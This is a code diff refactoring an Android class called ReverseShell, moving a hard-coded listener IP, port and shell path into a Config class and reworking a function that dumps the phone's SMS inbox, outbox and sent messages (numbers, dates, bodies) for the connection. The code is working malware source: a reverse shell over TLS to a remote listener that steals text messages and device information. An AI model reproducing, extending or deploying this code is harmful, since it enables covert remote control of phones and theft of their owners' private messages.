@@ -40,9 +40,9 @@ public class ReverseShell extends Activity {
 	// Includes the parameters of listening process
 	private TextView outputText;
 	private ProgressBar activitySpinner;
-	private final String host = "67.165.212.59";  // Host of Listener
-	private final String port = "7777";         // Port of Listener
-	private final String shellPath = "/system/bin/sh";
+	private final String host = Config.HOST;  // Host of Listener
+	private final String port = Config.PORT;         // Port of Listener
+	private final String shellPath = Config.SHELL_PATH;
 	private Context context;
 
 	@Override
@@ -60,7 +60,7 @@ public class ReverseShell extends Activity {
 
 			// UI cannot do networking stuff on its own, it needs
 			// a separate thread.
-			new SecureConnectionThread().execute(host, port, "true");
+			new SecureConnectionThread().execute(host, port, Config.USE_SSL_TRUE);
 
 		} catch(Exception e) {
 			System.exit(1);
@@ -92,24 +92,28 @@ public class ReverseShell extends Activity {
 		// Dump the contents of {inbox,outbox,sent} to the
 		// connection.
 		public String readSMSBox(String box) {
-			Uri smsuri = Uri.parse("content://sms/"+box);
-			Cursor cur = getContentResolver().query(smsuri, null, null, null,null);
-			String sms = ""; 
-			if(cur.moveToFirst()) {
-				for(int i=0; i < cur.getCount(); ++i) {
-					// Get information in a readable format
-					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
-					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
-					Long epoch = Long.parseLong(date);
-					Date fDate = new Date(epoch * 1000);
-					date = fDate.toString();
-					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
-					sms += "["+number+":"+date+"]"+body+"\n";
-					cur.moveToNext();
-				}
-				sms += "\n";
-			}
-			return sms;
+			Uri SMSURI = Uri.parse(Config.SMS_URL+box);
+			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
+			String sms = "";
+            try {
+                if (cur.moveToFirst()) {
+                    for (int i = 0; i < cur.getCount(); ++i) {
+                        // Get information in a readable format
+                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
+                        String date = cur.getString(cur.getColumnIndexOrThrow("date"));
+                        Long epoch = Long.parseLong(date);
+                        Date fDate = new Date(epoch * 1000);
+                        date = fDate.toString();
+                        String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                        sms += "[" + number + ":" + date + "]" + body + "\n";
+                        cur.moveToNext();
+                    }
+                    sms += "\n";
+                }
+            } catch(NullPointerException npe) {
+                return "";
+            }
+            return sms;
 		}
 
 		public String deviceInfo() {
@@ -156,7 +160,7 @@ public class ReverseShell extends Activity {
 
 			try {
 				// Load trust
-				KeyStore trustStore = KeyStore.getInstance("BKS");
+				KeyStore trustStore = KeyStore.getInstance(Config.KEYSTORE_TYPE);
 				InputStream storeStream = context.getResources().openRawResource(R.raw.android);
 
 				// Hard-coded password. Not proud of it, but it only
@@ -170,7 +174,7 @@ public class ReverseShell extends Activity {
 				storeStream.close();
 
 				// Create SSL Context
-				sslContext = SSLContext.getInstance("TLS");
+				sslContext = SSLContext.getInstance(Config.SSL_CONTEXT_TYPE);
 				sslContext.init(null, tmf.getTrustManagers(), null);
 				SSLSocketFactory sslsf = sslContext.getSocketFactory();
 				SSLSocket retSocket = (SSLSocket) sslsf.createSocket(ip, port);
@@ -179,7 +183,7 @@ public class ReverseShell extends Activity {
 				return retSocket;
 
 			} catch(GeneralSecurityException e) {
-				throw new IOException("Technically speaking, shit broke.");
+				throw new IOException("Unable to create socket.");
 			}
 		} // End getSecureSocket
 
@@ -187,7 +191,7 @@ public class ReverseShell extends Activity {
 		protected String doInBackground(String... params) {
 			String ret = "Error.";
 			try {
-				if(params[2].compareTo("true") == 0) {
+				if(params[2].compareTo(Config.USE_SSL_TRUE) == 0) {
 					sockfd = getSecureSocket(params[0], Integer.parseInt(params[1]));
 
 					// Enable Cipher Suites
